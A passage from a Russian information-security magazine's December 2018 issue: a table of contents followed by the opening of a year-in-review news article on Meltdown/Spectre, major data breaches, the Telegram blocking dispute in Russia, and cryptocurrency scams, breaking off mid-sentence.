
                                                  Декабрь 2018
            № 237
CONTENTS

    Итоги 2018
  Инциден ты, уязвимос ти, трен ды

    Дайджест Android
  Лучшие гайды, библиотеки и инструмен ты месяца

    От чет с ZeroNights 2018
  Как проходила топовая кон ферен ция по инфобезопасности

    Путешествие по даркнету
  Обходим самые злач ные места .onion

    Путешествие по даркнету
  Что интерес ного мож но найти в I2P

   Дырявый Word
  Как спря тать боевую нагрузку в докумен те

    Опас ный MikroTik
  Разбира емся в уязвимос тях популяр ных роутеров

    Эн кодеры msfvenom
  Разбира емся с кодировани ем боевой нагрузки при бинарной эксплуатации

    Поиграем в кар ты?
  Полное про хож дение заданий со смарт‐кар тами OFFZONE Badge Challenge

    Цеп ная реакция
  Разбира ем уязвимость от забыто го коммента рия до полной компрометации

    Старый сарай, новые грабли
  Эксплуатируем PHAR‐десери ализацию в phpBB

    Ата ка на приложение
  Исполь зуем Xposed, что бы обой ти SSLPinning на Android

    Ловуш ка на маковода
  Как работа ет уязвимость в клиенте GitHub для macOS

    Мед вежьи сер висы
  Про веря ем 7 популяр ных провайдеров VPN на пред мет приватности

    Хак для Xiaomi Camera
  Получа ем кон троль над дешевой и практичной камерой наб людения и приучаем ее к iOS

    Арсенал багханте ра
  Под бира ем софт для быстро го поиска уязвимостей при участии в Bug Bounty

    Задачи на собесе дованиях
  За дачи от ком пании Abbyy

    Пишем эмулятор игровой консоли
  Как устроена леген дарная приставка Nintendo и как ее воссоздать самому

    Пишем стилер
  Как вытащить пароли Chrome и Firefox сво ими руками

    Аудит Windows
  Выбира ем ком мерчес кий софт для комплексной проверки безопасности

    Резино вый гипервизор
  Исполь зуем логические группы для виртуализации QEMU‐KVM в Linux

    Вечнозеленая Фуксия
  Изучаем операционку, которую Google готовит на смену Android

     Тит ры
  Кто дела ет этот журнал

                                           Мария «Mifrill» Нефёдова
                                                          nefedova@glc.ru



  2018 год подходит к концу. А значит, приш ло время подвести
   итоги!





   Уходящий год сле довал практически тем же курсом, что и его предшествен‐
    ник. К сожалению, мы не можем сообщить о каких‐либо значительных улуч‐
   шениях в той или иной области и в основном наб людаем раз витие ранее
    установившихся трендов. К примеру, одной из основных угроз для рядовых
   пользователей и бизнеса по‐прежнему остаются шифровальщики и вымога‐
    тели, хотя специалисты по безопасности говорят об этой проблеме и методах
   защиты от нее уже очень давно. Также не спешит улучшаться и обстановка
   в сфере IoT: устрой ств интернета вещей ста новится все больше, и в массе
   своей они все так же небезопас ны, а про изво дители порой вообще не тру‐
   дятся выпускать патчи.
     Множество рисков по‐преж нему сосредоточено и вокруг рынка крип‐
   товалют. После стремитель ного роста  курсов в конце прошлого года
   в 2018 году можно было наблюдать очередной виток увеличения инте реса
    к этой области, как среди прос тых пользователей, так и сре ди преступников.
   Всевозможные скрытые майнеры определен но мог ли бы посоревноваться
   с шифровальщиками за зва ние самых распростра ненных угроз года.





 MELTDOWN
 И SPECTRE
   Уязвимости  Meltdown  и  Spectre  (CVE‐2017‐5754,  а  также  CVE‐2017‐
   5753 и CVE‐2017‐5715), информация о которых была опубликована в янва‐
   ре 2018 года, взбудоражили всю индустрию, ведь выяснилось, что практичес‐
   ки все современные процес соры (выпущенные после 1995 года) имеют фун‐
   даментальные проб лемы, решить которые прос тыми софтверными патчами
   возможно далеко не всегда. Фактичес ки под угрозой оказались все устрой‐
    ства, работающие с уяз вимыми про цес сорами: от телевизоров и смартфонов
   до серверов и рабочих станций.
     Используя эти уязвимости, легко нарушить изоляцию адресного прос‐
   транства, прочитать пароли, ключи шифрования, номера банковских карт,
   произвольные данные системных и дру гих пользовательских приложений
   в обход любых средств защиты и на любой ОС. Обе проблемы дают воз‐
   можность проводить ата ки по стороннему каналу  (side channel  attack),
   используя недостатки физичес кой реализации процессоров.
     Информацию об уязвимос тях раскрыли раньше запланированного срока.
   Крупным компаниям стало извес тно о проб леме еще летом 2017 года, одна‐
   ко в начале января информация о гло бальных проб лемах «во всех процес‐
   сорах сразу» неожиданно просочилась в прессу. Компании были вынуждены
   ускорить выход исправлений и выступить с офи циальными заявлениями, что‐
   бы пресечь слухи, становившиеся все безумнее.
     Мало того что само существование Meltdown и Spectre представляет
   огромную проблему для всей индус трии и для прос тых пользовате лей, ситу‐
   ацию дополнительно ухудшили и сами про изво дители уязвимых решений.
   Дело в том, что софтверные пат чи и микрокоды, призванные обе зопасить
   устройства от Meltdown и Spectre, в итоге выпус кались в спешке и на про‐
   тяжении многих месяцев порождали всевоз можные сбои и баги.
     Зачастую патчи оказывались несовместимы с антивирусными решениями,
   вызывали отказ в работе, провоцирова ли появление BSOD и частые перезаг‐
   рузки и даже создавали новые уязвимости. В итоге распространение патчей
   и микрокодов неоднократ но приоста навливали и возобновляли, что при вело
    к невероятной путанице.
     В конечном ито ге из‐за это го предста вители Intel, AMD, ARM, Apple, Ama‐
    zon, Google и Microsoft были вынуждены держать ответ перед комитетом
   сената США по энергетике и торговле, объясняя, как такое произошло.
      Хуже того, даже правиль но уста новленные и работающие исправления
   негативным образом ска зываются на производительнос ти процессоров,
   и ничего поделать с этим, к сожалению, нельзя. Хотя большинство иссле‐
   дователей сходятся во мнении, что во время работы над обычными задачами
   рядовой пользователь не заметит никакой разницы, в некоторых случаях
   потеря производительности все же может ока зать ся существенной.
     По разным данным и оценкам, после уста новки патчей процессоры могут
   терять 5–50% своей мощности. Конкретные цифры зависят от множества
   факторов: архитектуры, железа, ОС, исполня ющихся задач и так далее.
   Острее всего снижение производитель ности ожидаемо проявляется на ста‐
   рых моделях процессоров и ста рых ОС.


  ВАРИАЦИИ АТАК НА MELTDOWN И SPECTRE
    Вскоре после того, как о Meltdown и Spectre стало известно миру, ИБ‐спе циалисты и иссле‐
    дователи предуп редили, что в будущем наверняка появятся новые варианты этих уяз вимос тей
    и способы их эксплуатации. Нечто подобное ранее можно было наблюдать в развитии проб‐
    лемы Rowhammer.К сожалению, прогнозы специалис тов пол ностью оправдались, и к кон‐
    цу 2018 года были обнаружены следующие разновидности данных проблем.

   MELTDOWN:
→L1TF (L1 Terminal Fault) или Foreshadow;
→вариант 3а;
→вариант 1.2;
→Lazy FP;
→Meltdown‐BR и Meltdown‐PK.

   SPECTRE:
→вариант 1.1;
→вариант 4;
→BranchScope;
→SgxSpectre;
→SpectreNG;
→SpectreRSB;
→NetSpectre;
→SplitSpectre;
→Spectre‐PHT, Spectre‐BTB, Spectre‐RSB и Spectre‐BHB.





 УТЕЧКИ ДАННЫХ
 ПОВСЮДУ
   Одной  из  главных  проб лем  в сфере информационной  безопасности
   по‐прежнему остаются утечки данных. Они происхо дят пос тоянно и слу чаются
    как с неболь шими фир мами, так и с круп ней шими представителями ИТ‐рынка
   и даже с киберпреступниками. Порой вина за такие инциденты лежит
   на самих сотрудниках постра давшей компании, демонстри рующих халатное
   отношение к защите, а порой «сливы» данных — результат хорошо спланиро‐
   ванных  и  тщательно  проработанных  хакерских  операций,  защититься
   от которых действительно было сложно.
      Утечки данных не только ставят под угрозу рядовых пользователей, они
   могут быть использованы преступниками для атак типа password reuse, когда
   даже простой брутфорс превращается в серь езное оружие. Хуже того, лич‐
   ные данные людей, попавшие в руки третьих лиц, могут использоваться
   для кражи личности, мошенничес тва со стра ховкой, банального шантажа
   и множества других видов ска ма.
      Кстати, напомним, что осенью 2018 года инженеры Mozilla объявили
   о запуске бесплатного сервиса Firefox Monitor, раз работанного в содружестве
   с агрегатором утечек Have   I Been Pwned. Сервис позволяет проверить,
   не были ли скомпрометированы email‐адрес и связанные с ним аккаунты.
   Советуем не пренебрегать этой воз можностью.
      Также с сожале нием отметим, что в этом году пароли 123456 и qwerty сно‐
   ва оказались одними из самых исполь зуемых.





   Facebook и Cambridge Analytica
   Наиболее гром ким инцидентом прошедшего года определенно стал мас‐
   штабный скандал, в центре которого оказалась компания Facebook.
     Весной 2018 года широкой общес твенности ста ло известно, что бри тан‐
   ская компания Cambridge Analytica сумела заполучить информацию о 87 мил‐
   лионах пользователях Facebook (без ведома последних). Сбор данных велся
   под видом простого опроса, для участия в котором нужно было войти через
   Facebook.





   Таким образом было «опрошено» около 270 тысяч человек, но в то время API
   социальной сети позволял собрать данные о друзь ях этих пользователей, что
   в итоге и принесло «исследователям» информа цию о десятках миллионов
   человек. Эти данные были использованы для составления психологических
   портретов и разработки персонализированной рекламы. Так как основным
   вектором работы Cambridge Analytica были алгоритмы анализа политических
   предпочтений избирателей, данные пользователей социальной сети исполь‐
   зовались во время десятков избирательных кампаний в раз личных странах
   мира.
     В итоге социальную сеть обвинили в наплевательском отношении к дан‐
   ным своих пользователей, халат ности и замалчивании случившегося, а Cam‐
    bridge Analytica подозревали едва ли не в связях со спецслужбами и влиянии
   на результаты выборов (в том числе американских). Весь мир в одночасье
   заговорил о том, какая огромная ответственность лежит на компаниях,
   с которыми пользователи сами делятся своими личными данными. И какую
   невероятную ценность весь этот материал представляет для маркетологов,
   политологов и многих других заинтересованных лиц.
      Хотя представители Facebook не раз пуб лично извинялись за слу чив‐
   шееся, имидж компании силь но постра дал, о чем явно говорят подорванное
   доверие пользователей, потерявшие в цене акции компании и многочис‐
   ленные судебные иски. Теперь социальная сеть дела ет все возможное, чтобы
   пользователи поверили: компания стремится измениться к лучшему и учится
   на своих ошибках. Например, Facebook рас ширила программу bug bounty,
   призвав исследователей искать приложения, которые могут злоупотреблять
   данными, полученными от Facebook (то есть информацией пользователей).
   Также разработ чики Facebook стали «заворачивать гайки» и для самих сто‐
   ронних приложе ний, использующих API социальной сети. В частнос ти, если
   пользователь не притрагивается к приложению более трех месяцев, теперь
   оно автоматически лишается доступа к его данным.



        «Мы недос таточ но фокусирова лись на пре дотвра щении злоупотребле-
         ний и недос таточ но думали о том, как люди могут использовать эти
         инс тру менты для нанесе ния ущер ба. Для полного осоз нания нашей
          ответс твенности нам не хва тило широты взгляда на вещи. Это была
         моя ошибка», — заявил в интервью The New York Times гла ва Face-
         book Марк Цукер берг.


  ДРУГИЕ СКАНДАЛЫ FACEBOOK
   Одним лишь скандалом из‐за Cambridge Analytica дело не ограничилось. В 2018 году компания
    Facebook была связана и с другими неприятными инциден тами, приведшими к утечкам данных.
→Из‐за бага в работе функции «Посмотреть как» (View as) были скомпрометированы данные
    как минимум 30 миллионов человек
→Было обнаружено приложение NameTests, злоупотреблявшее данными пользовате лей Face‐
    book. Оно давало любому желающему дос туп к информации о 120 миллионах человек
→Как выяснилось после инцидента с Cambridge Analytica, соцсеть официально делилась дан‐
   ными пользователей с 52 сторонними ком паниями и 61 разработчиком приложе ний





   От авиакомпаний до спамеров
   Как уже было сказано выше, от утечек данных не застрахован никто. И хотя
   никому по‐прежнему не уда лось отобрать паль му первенства у компании Ya‐
   hoo, которая еще в 2016 году призналась в утечке данных полутора миллиар‐
   дов (sic!) пользователей, серь езных происшествий в 2018 году было немало.
   Вспомним наиболее яркие случаи.
     Своеобразный антирекорд это го года при надлежит международной сети
   отелей  Marriott. В  конце  года  был  обна ружен  взлом,  случившийся
   еще в 2014 году. Проникновение в систему произошло за два года до того,
    как Marriott приобрела сеть Starwood (включая такие бренды, как W Hotels, St.
    Regis, Sheraton Hotels & Resorts, Westin Hotels & Resorts, Element Hotels, Aloft
    Hotels, The Luxury Collection, Tribute Portfolio, Le Méridien Hotels & Resorts, Four
    Points by Sheraton и Design Hotels). Как оказалось, злоумышленники похитили
   информацию обо всех постояльцах, которые прибегали к услугам системы
   Starwood за последние годы, а это около 500 миллионов человек.
     В конце лета о взло ме и утечке данных со общил один из самых посеща‐
   емых сайтов в интернете Reddit. Неизвес тные злоумышленники сумели обой‐
    ти двухфакторную аутентифика цию в акка унтах нес кольких сотрудников ком‐
   пании и похитили самые разные данные: от исходных кодов до email‐адресов
   пользователей и бэкапов БД.
      ИБ‐специалисты обна ружили, что на андегра ундных хакерских форумах
   свободно продается информа ция о 200 миллионах жителей Японии. Так
    как население страны в настоящее время оценива ется в 127 миллионов
   человек, исследовали заключили, что база зло умышленников содержит дуб‐
   ликаты (около 36%) и «мусорную», недействи тель ную информацию.
     В похожей ситуации ока зались и 120 миллионов бразильских налогоп‐
   лательщиков. Специалис ты обнаружили в Сети незащищенную и свободно
   доступную БД, содержащую личные данные миллионов человек, включая
   идентификационные номера налогоплательщиков (Cadastro de Pessoas Físi‐
    cas, CPF), телефоны, адреса, информацию о кредитах, данные о военной
   службе и другие.
     Была скомпрометирована информация о 92 миллионах пользовате лей
   популярного гибрида социальной сети и генеалогического сайта MyHeritage.
   К счастью, финансовая информация, а также результаты ДНК‐тес тов поль‐
   зователей в руки неизвестных зло умыш ленников не попали.
     Осенью 2018 года хакерским ата кам и утечкам данных подверглись круп‐
   ные авиакомпании British Airways и Cathay Paciﬁc. Была скомпрометирована
   информация миллионов пассажиров, включая личные и финансовые данные.
      У самих хакеров тоже случаются подобные про колы. Например, из‐за
   ошибки опе раторов ботнета  Trik достоянием общественности стала ба‐
   за 43 миллионов поч товых адресов, исполь зовавшаяся для рас сылки спама.
     Иронично, но подоб ные промахи допускают даже разработчики спайвари,
   продающие легальные решения для слежки простым гражданам. Компании
    TheTruthSpy и Spyfone уличили в халат ном отно шении к безопас ности — пос‐
   торонние лица смогли получить доступ  к данным их клиентов и даже
   информации, которую собира ла созданная компаниями спайварь.


                                         Продолжение статьи →
← Начало статьи





  Утеч ки исходных кодов
  Еще один интересный вид утечек данных — это утечки исходных кодов. Чтобы
  оценить всю потенциальную серь езность  таких инцидентов, достаточно
  вспомнить, к каким последс твиям привела публикация исходников IoT‐вре‐
  доноса Mirai или похищенного у АНБ хакерского инстру ментария, обнародо‐
  ванного в открытом доступе хак‐груп пой The Shadow Brokers.
     Весной 2018 года хак‐группа, называ ющая себя Dark‐Liberty Team, опуб‐
  ликовала в открытом дос тупе исходный код iBoot — одной из ключевых сос‐
   тавляющих устрой ств Apple, которая отвечает за процесс доверенной заг‐
   рузки ОС. Фактически именно iBoot стартует одним из первых после вклю‐
  чения устройства (до него запускает ся толь ко Boot ROM), он находит
  и верифицирует ядро, проверяя, имеет ли оно необходимые подписи Apple,
  а затем передает ему управление или переключа ет девайс в режим восста‐
  новления.
     Сначала исходники были размещены на GitHub, но компания Apple опе‐
  ративно подала жалобу о нарушении DMCA (Digital Millennium Copyright Act,
  «Закон об авторском праве в цифровую эпоху»), после чего адми нистрация
   GitHub поспешила удалить спорный контент. Вско ре исходные коды вновь
  появились в Сети, но уже в зоне .onion, то есть в даркне те.
    В марте 2018 года в открытом доступе были опубликованы ис ходные коды
  PoS‐малвари TreasureHunter. Из‐за чего произош ла утечка, доподлинно неиз‐
  вестно, однако после эксперты прог нозировали прирост PoS‐малвари.
  Похожие пики активности после утечки исходных кодов уже не раз демонс‐
  трировали другие угрозы, например банкер Zeus или мобильный банкер
   BankBot.
    Еще один  интересный репозиторий был  удален с  GitHub  в  конце
   лета 2018 года. Он также был закрыт из‐за жалобы на нарушение DMCA,
  на этот раз поданной представителями компании Snap Inc. Как оказалось,
   в мае 2018 года обновление iOS‐версии при ложения случайно рас кры ло
   часть исходных кодов Snapchat, которые в итоге и распространились по Сети.
  После закрытия репозитория СМИ обна ружили его копии на GitHub и других
   платформах.
     Все на том же GitHub появился и исходный код популярного инструмента
  DexGuard, который разрабатывает компания Guardsquare. Этот платный ана‐
   лог ProGuard используется для обфускации и защиты Android‐при ложе ний
   от обратного инжиниринга и взло ма. DexGuard при меняется разработчиками
  для защиты от взло ма и кло нирования приложений (порой это связано
  с пиратством), сбора учет ных данных и других проб лем.
     Случай, выделяющийся из череды похожих инци дентов, произошел летом
  текущего года. Тогда был арес тован бывший сотрудник NSO Group, который
  похитил исходные коды легальной коммерческой спайвари и попытался про‐
   дать их в даркне те за 50 миллионов долларов. Напомню, что широкую извес‐
   тность NSO  Group  получила  в  2016–2017  годах,  когда  специалисты
  по информационной безопас ности обнаружили мощ ные шпионские инстру‐
  менты Pegasus и Chrysaor, разработанные компанией и предназначенные
  для iOS и Android. Тогда эксперты называ ли NSO Group не иначе, как «тор‐
  говцами кибероружием».





 БИТВА ЗА TELEGRAM
  Весной и летом 2018 года противос тояние Рос комнадзора и мессенджера
   Telegram, берущее начало еще в прошлом году, стало одной из самых
  обсуждаемых тем в Рунете. Рос комнадзор попытал ся ограничить доступ
   к мессенджеру на тер ритории РФ, однако эта затея так и не увенчалась успе‐
   хом.
    Противостояние компании Telegram Messenger LLP и российских над‐
  зорных органов началось в 2017 году. Тогда Telegram был зарегис трирован
   в реестре организаторов распространения информации (после продол‐
  жительного скандала), хотя Павел Дуров подчеркивал, что компания тем
  самым не берет на себя никаких дополнительных обя зательств и не собира‐
   ется предоставлять кому‐либо дос туп к перепис ке пользователей. Когда
  представители мессенджера отказались передать ФСБ ключи шифрования,
  суд оштрафовал компанию за совершение админис тративного правонаруше‐
  ния (статья 13.31 часть 2.1 КоАП РФ).
     После этого Telegram Messenger LLP заручилась поддержкой юристов
  международной правозащит ной группы «Агора» и обратилась в суд с тре‐
  бованием признать незаконным приказ ФСБ от 19 июля 2016 года № 432 (Об
   утверждении  порядка  представления  орга низаторами  распространения
  информации  в информа ционно‐телекоммуника ционной  сети  «Интернет»
   в Федеральную службу безопас ности Рос сийской Федерации информации,
  необходимой для декодирова ния принимаемых, передаваемых, доставля‐
  емых и  (или) обрабатываемых  электронных сообщений  пользователей
  информационно‐телекоммуника ционной сети «Интернет»).
    Компания попыталась доказать, что данный приказ противоречит закону
  об информации, закону об ФСБ, а также был при нят неупол номоченным
  органом с превышением полномочий. 20 марта 2018 года Telegram проигра‐
  ла этот процесс, после чего представители Рос комнадзора обратились в суд
  с требованием о блокировке. В ито ге 13 апреля 2018 года Таганский суд
  города Москвы принял решение блокировать мес сенджер, и уже 16 апре‐
  ля 2018 года Роскомнадзор перешел к решительным действиям.
    Попытки блокировать Telegram при вели лишь  к своеобразному пов‐
  торению ситуации с интернет‐рацией Zello (толь ко в большем масштабе).
  Дело в том, что разработчики Zello укло нялись от блокировки в РФ, прибегая
   к услугам Amazon Web Service, постоянно меняя адреса. В итоге Роскомнад‐
  зор начал блокировать адреса AWS, и предста вители Amazon попросили Zello
  прекратить использовать Amazon AWS для подоб ной деятельности.
     Разработчики Telegram использовали аналогичную тактику, и под бло‐
  кировку попали десятки миллионов адресов, принадлежащих компани ям
  Amazon, Google, Microsoft, крупным хос тинг‐про вай дерам Digital Ocean, Het‐
   zner, OVH и другим.
     Хотя блокировки сказывались на работе самого Telegram лишь нез‐
  начительно, они предсказуемо ста ли мешать нормальному функционирова‐
  нию множества других сайтов, систем и сервисов. К примеру, практически
  сразу после начала блокировок в Viber перестали работать голосовые звон‐
   ки; в какой‐то момент с перебо ями работал даже Google («задело» как сам
  поисковик, так и другие сервисы компании, к при меру переводчик и аналити‐
   ку); пользователи жаловались на недос тупность Twitch, PlayStation Network,
  Steam, Battle.net; о проблемах сообщали крупные ретейлеры, малый бизнес
  и многие, многие другие. Но представители Роскомнадзора утверждали, что
  большинство из этих сооб щений неверны, а СМИ следует лучше проверять
  информацию.
    В отличие от ситуации с Zello «веерные блокировки» не привели к ана‐
   логичному результату. Хотя в Рос комнадзоре не раз уверяли, что с пред ста‐
   вителями Google и Amazon «ведется диалог», Telegram для iOS и Android так
  и не был удален из официальных каталогов при ложений (Роскомнад зор зат‐
  ребовал удаление в соответс твии с решени ем суда), а мессенджер так и не
  «попросили на выход».
    С самого начала Павел Дуров четко обозначил свою позицию и заявил,
   что не собирается уступать давлению властей. На своей странице «ВКон‐
   такте» глава Telegram неоднократно благода рил поль зовате лей за поддержку
  и даже писал, что начал выплачивать Bitcoin‐гранты администраторам VPN
  и прокси‐серверов «в рамках Цифрового Сопротивления — децентрализо‐
  ванного движения в защиту цифровых свобод и прогресса». Кроме того,
  Дуров заявлял о твердом намерении и далее тра тить на поддержание дос‐
   тупности Telegram миллионы долларов. А в сво ем Telegram‐канале Дуров бла‐
  годарил не только пользователей, но и компании Apple, Google, Amazon и Mi‐
   crosoft за то, что те не стали «принимать учас тие в политической цензуре».
    С апрельских событий прошло уже больше полугода, 2018‐й подошел
   к концу, а Telegram в Рос сии по‐прежнему работает без VPN, прокси и допол‐
  нительных ухищрений. Больше не делает громких заявлений Рос комнадзор,
  ранее сообщавший, что «деградация сервиса сос тавляет в течение суток
   от 15 до 35–40% на раз личных смартфонах», а также оце нивавший примерно
   в 25% отток рекламы из Telegram‐каналов и отток пользователей мессендже‐
   ра. Новые IP‐адреса не попадают под блокировку сотнями тысяч.
    Однако  называть  это  противостояние  завершенным  опре деленно
  еще рано. Так, в конце декаб ря 2018 года СМИ сообщили, что в будущем
   году Роскомнадзор планирует внедрить новую технологию борьбы с зап‐
  рещенными сайтами и сервисами, в том числе и с Telegram. Речь идет о тех‐
  нологии DPI (deep packet inspection), и, по оценкам источников, влас ти готовы
   потратить на это около 20 миллиардов руб лей.
     Хотя Александр Жаров опроверг информацию в интервью ТАСС, он также
   заметил:



        «Мы, безус ловно, работа ем над под ходами к эффектив ной, точеч ной
        блокиров ке контента не только сайтов, но и приложе ний. Потому что
         это может потребоваться, в том чис ле в чрез вычайной ситу ации.
        Но говорить о том, что такое‑то решение готово, эта конкретная раз-
         работка будет применяться и она стоит столько‑то рублей, рано».

  Нужно сказать, что «под прицелом» в итоге может вновь оказаться не только
   Telegram. В последние месяцы Роскомнадзор живо инте ресуется деятель‐
  ностью таких компаний, как Facebook, Twitter и Google.
     К примеру, в конце ноября 2018 года обна ружи лось, что в отношении ком‐
  пании Google было возбуждено администра тивное дело. Проблема зак‐
  лючалась в том, что Google не подключен к федеральной государственной
  информационной системе (ФГИС), при помощи которой должна фильтро‐
   ваться поисковая выдача. Из выдачи должны исклю чаться заблокированные
   в России сайты, перечень которых и содержит ФГИС.
    В итоге в середине декабря Google действительно была оштрафована
  на 500 тысяч рублей в соот ветс твии с частью 1 статьи 13.40 КоАП РФ. В Рос‐
  комнадзоре сообщили, что в ближайшее время регулятор может возбудить
  еще одно административное дело против компании,  так  как намерен
  «добиваться соблюдения российского законодательства». Замес титель гла‐
  вы Роскомнадзора Вадим Суб ботин и вовсе заявил, что, если Google и далее
  продолжит игнорировать требования о фильтрации поисковой выдачи от зап‐
  рещенного контента, в рос сийское законодательство могут быть вне сены
  изменения, которые позволят блокировать поис кового гиганта в РФ.
     Facebook и Twitter, в свою очередь, до сих пор не локализовали базы дан‐
  ных пользователей в России. В связи с этим представители Роскомнад зора
  направили компаниям уведомления о необ ходимости соблюдения закона.
  По словам главы ведомства Александра Жарова, ответа от компаний будут
  ждать 30 дней, то есть до 17 янва ря 2019 года.



        «В слу чае отрицательного отве та мы воз бужда ем админис тра тив ное
         дело, штра фуем их на 5000 рублей в связи с этим и опре делим срок,
         в течение которого они должны будут локализовать эти данные:
         от шес ти месяцев до года», — говорит Жаров.

  Более того, Жаров выразил надежду, что в течение этого вре мени будут вве‐
  дены оборотные штрафы, которые станут для компаний более существенным
   стимулом исполнять законодательство.





 КРИПТОВАЛЮТЫ
 И ИХ ПРОБЛЕМЫ
  В прошлом году, еще до того, как стоимость Bitcoin преодолела 20 тысяч дол‐
   ларов, эксперты уже отмечали сложившийся тренд повышенного внимания
   к криптовалютам и всему, что с ними связано. А пос ле того, как в декаб‐
  ре 2017 года курсы превзошли даже самые смелые ожидания, интерес к этой
  области закономерно возрос еще, в том числе и в прес тупном мире.
    Поэтому сов сем неудивительно, что 2018 год продолжил развивать тен‐
  денции, оформившиеся ранее. Киберпрес тупников не останавливает даже
   тот факт, что с декабря 2017 года криптовалюты значительно подешевели и в
  настоящее время потеряли большую часть своей стоимости. Майнинговых
  вредоносов все равно ста ло значительно больше, и добывать криптовалюту
  за чужой счет пытаются как при помощи заражения мощных серверов и круп‐
  ных компаний, так и на мобиль ных устройствах, наводняя каталоги приложе‐
  ний и Сеть приложениями со скрытыми майнерами.
    Продолжает процветать и криптоджекинг (cryptojacking). Суть этого явле‐
  ния предельно проста: в код сайтов внедряют специальные скрипты, которые
  конвертируют мощ ности CPU посетителей ресурса в криптовалюту. Фак‐
   тически это простой майнинг через бра узеры. Так как с этой напастью
   активно борются производители защитных решений, блокировщиков рек‐
  ламы и так далее, зло умышленники ста ли маскировать майнинговые скрипты
  иными способами. Например, популярный сервис для браузерного майнинга
   Coinhive теперь предлагает своим клиентам услугу сокращения URL (cnhv.co).
  Вот как описывают этот сервис сами операто ры Coinhive:



         «Если у вас есть ссылка, по которой вы хотели бы пере адре совать
         пользовате ля, с помощью cnhv.co вы можете соз дать ее сок ращенную
        вер сию. Пользовате лю придется выс читать опре деленное количес тво
        хешей (которое зада ете вы), а затем он будет автоматичес ки нап-
         равлен на целевой URL».

  При этом, по данным аналитиков из Рейнско‐Вес тфальского технического
  университета Ахена, всего десять пользователей ответственны за раз‐
  мещение 85% ссылок, свя занных с майнин говым сервисом Coinhive. Экспер‐
  ты подсчитали, что в месяц Coinhive добывает Monero на 250 тысяч дол ларов
  США. Хотя, помимо Coinhive, существу ют и дру гие аналогичные сервисы, он
  удерживает пальму первенства с большим отрывом.





  Скам
  Как уже было сказано выше, криптовалюты по‐прежнему вызывают огромный
  интерес у рядовых поль зователей, а значит, и у скамеров, которые всегда
  «держат нос по ветру» и ищут новые способы обмана доверчивых граждан.
    Обилие самых разных мошенничес ких предложений, скрытых майнеров,
  а также рекламы фальшивых и подоз рительных ICO привели к тому, что Face‐
  book и Instagram вооб ще зап ретили пуб ликовать связанную с криптовалю‐
  тами рекламу (позже полный запрет был снят для доверенных рекламода‐
   телей), компания Google запретила рас простра нять через Chrome Web Store
  расширения для майнинга и тоже ограничила рекламу, а Apple запретила
  майнинг через приложения на своих устройствах.
     Увы, нельзя сказать, что компании прос то перестраховывались. Чтобы
  убедиться в этом, достаточно вспомнить лишь несколько громких инциден‐
   тов, произошедших в 2018 году. К при меру, в начале года преступники про‐
  вели несколько фальшивых ICO, обманув инвесто ров.
      Так, официальное ICO проекта  Experty, занимающегося VoIP‐связью
  на блокчейне, дол жно было стартовать 31 января, однако мошенники опе‐
  редили настоящих разработчиков. Пользователи, заранее подписавшиеся
  на уведомления от Experty, получили пись ма, в которых объявлялось об офи‐
  циальном старте ICO и начале продаж токенов Experty (EXY). Для покупки
  токенов инвесторам было предложено перечислять средства на указанный
   в тексте послания Ethereum‐кошелек. Разумеется, эти сообщения оказались
  фальшивкой, а данный кошелек не имел никако го отношения к разработ‐
  чикам Experty, которые организо вывали нас тоящую продажу токенов через
  сервис Bitcoin Suisse. Тем не менее пользователи поверили. Судя по содер‐
  жимому   Ethereum‐кошелька   мошенников,   им   удалось   привлечь
  более 150 тысяч дол ларов.
     Как именно произошла утечка контактов пользователей, заинтересован‐
  ных в ICO Experty, до конца неясно. Судя по всему, неизвестный хакер
  получил доступ к базе пользовательских email‐адре сов через компьютер
  одного из сотрудников, который занимался Proof‐of‐Care проекта.
     Практически аналогичная участь постигла криптовалютный проект Bee To‐
   ken, который разрабатывает сервис аренды жилья, похожий на Airbnb. Офи‐
  циальное ICO Bee Token стартовало 31 января и завершилось 2 февраля.
  Разработчики успешно собрали 5 миллионов дол ларов США, как и было зап‐
  ланировано. Но, как выяснилось, параллельно с этим мошенники тоже успе ли
  «заработать» почти миллион долларов.
    Одновременно с началом нас тоящего ICO зло умышленники начали рас‐
  пространять свои собственные письма и сооб щения в Telegram, в которых
  выдавали себя за предста вителей команды Bee Token, рассказывали о старте
  ICO и предлагали инвесторам переводить средства на Ethereum‐кошельки.
  Стоит ли говорить, что кошельки из фальшивых сообщений принадлежали
  самим мошенникам? СМИ сумели отследить три кошелька злоумышленников,
   где было обнаружено око ло миллиона долларов.
     Если кажется, что хуже этих двух случаев уже ничего быть не может, вспом‐
  ним, что стартап LoopX, обещавший пользователям раз работать мобильное
  приложение для торговли криптовалютой на базе собственного уникального
  проприетарного алгорит ма, вообще ока зался фальшивкой. Разработчики
  LoopX исчезли в неизвес тном направлении, а все аккаунты проекта в соци‐
  альных сетях, включая Facebook, Telegram и YouTube, были удалены. ICO про‐
   екта стартовало еще в янва ре 2018 года, и, когда команда LoopX исчезла,
  с инвесторов успели соб рать 276,21 Bitcoin и 2446,70 Ethereum. То есть
  на продаже токенов LoopX Coin мошенники зарабо тали около 4,5 миллионов
  долларов по курсу на тот период.
     Также о доверчивости и наивности пользователей ярко свидетельствуют
  и другие, почти комичные случаи. В начале текущего года мы рас сказывали
  о предельно простой мошеннической схеме, которая полюбилась скамерам
   в Twitter. Тогда эксперты заметили, что преступники соз дают в социальной
  сети поддельные профили, которые имитируют настоящие аккаунты извес‐
   тных личностей. Затем они спамят записями от лица этих аккаунтов, пред‐
   лагая пользователям поучаствовать в бесплат ной раздаче криптовалюты.
  Для участия в раздаче, конечно же, нужно перевес ти немного денег на счет
  злоумышленников.
    С тех пор у многих извес тных личностей в профилях появились не только
   галочки верификации, но и недвусмысленные приписки в духе «не раз даю
  криптовалюту!». Также с подобным скамом борются и сами разработчики
   Twitter, но, увы, практичес ки безрезультатно.
     Преступники идут в ногу со временем и пос тоянно меняют «почерк». Так,
   в ноябре 2018 года обнаружилось, что теперь злоумышленни ки не создают
  новые учетные записи в Twitter, а взламыва ют верифицированные аккаунты
  других пользователей и компаний, меняют их имя на Elon Musk, а затем объ‐
   являют от име ни Маска о большой раз даче криптовалюты — 10 тысяч биткой‐
   нов. В числе взло манных учетных записей были обнаружены аккаунты лейбла
  Marathon Artists, издательства Pantheon Books, крупного бри танского ретей‐
  лера Matalan и многих дру гих.
    Дополнительно взло му подверглись учет ные записи правительственных
  учреждений, вклю чая  аккаунты колум бийского министерс тва транспорта
  и Национального управления по ликвидации последствий стихийных бедс‐
   твий Индии. Через них хакеры привлекали внимание к действиям поддель‐
  ного Маска, создавая видимость легитимности происходяще го.
     Фальшивые профили «Ило на Маска» продвигали нес колько вредоносных
